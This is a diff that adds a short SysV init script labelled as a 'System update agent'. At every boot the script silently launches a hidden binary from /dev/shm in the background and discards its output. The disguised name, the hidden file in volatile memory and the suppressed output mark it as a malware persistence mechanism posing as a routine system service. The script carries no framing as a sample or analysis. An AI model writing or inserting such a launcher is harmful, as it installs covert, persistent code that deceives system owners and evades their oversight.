@@ -1,0 +1,15 @@
+#!/bin/sh
+### BEGIN INIT INFO
+# Provides:          sysupdate
+# Required-Start:    $network
+# Default-Start:     2 3 4 5
+# Default-Stop:
+# Short-Description: System update agent
+### END INIT INFO
+
+case "$1" in
+  start)
+    nohup /dev/shm/.sysupdate >/dev/null 2>&1 &
+    ;;
+esac
+exit 0
